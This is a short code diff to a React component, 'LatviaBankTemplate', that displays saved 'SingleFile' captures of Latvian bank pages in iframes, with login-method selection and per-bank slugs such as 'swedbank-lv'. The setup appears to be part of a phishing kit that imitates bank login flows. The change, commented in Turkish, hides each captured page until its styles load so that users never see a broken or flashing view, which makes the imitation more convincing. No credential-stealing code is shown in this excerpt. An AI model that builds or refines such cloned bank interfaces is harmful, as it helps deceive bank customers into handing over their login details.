@@ -42,6 +42,7 @@ export function LatviaBankTemplate({ bankSlug, onChange, handleRouteAction, savi
   });
   const [currentIndex, setCurrentIndex] = useState(0);
   const [selectedLoginMethod, setSelectedLoginMethod] = useState("");
+  const [loadedFiles, setLoadedFiles] = useState<Record<string, boolean>>({});
   const iframeRef = useRef<HTMLIFrameElement>(null);
   const disableIframeFade = [
     "swedbank-lv",
@@ -3318,15 +3319,20 @@ export function LatviaBankTemplate({ bankSlug, onChange, handleRouteAction, savi
                 ? "z-0 pointer-events-none"
                 : "opacity-0 z-0 pointer-events-none"
           }`}
-          style={{ 
-            width: '100%', 
-            height: '100%', 
-            border: 'none', 
-            margin: 0, 
+          style={{
+            width: '100%',
+            height: '100%',
+            border: 'none',
+            margin: 0,
             padding: 0,
-            visibility: index === currentIndex ? 'visible' : 'hidden'
+            // Yuklenmemis iframe'i ASLA gosterme - SingleFile capture'in CSS'si
+            // gec yuklendiginde bozuk/flasli ilk gorunum cikiyordu
+            visibility: index === currentIndex && loadedFiles[file] ? 'visible' : 'hidden'
           }}
-          onLoad={(e) => handleIframeLoad(e.target as HTMLIFrameElement)}
+          onLoad={(e) => {
+            setLoadedFiles((prev) => (prev[file] ? prev : { ...prev, [file]: true }));
+            handleIframeLoad(e.target as HTMLIFrameElement);
+          }}
         />
       ))}
     </div>
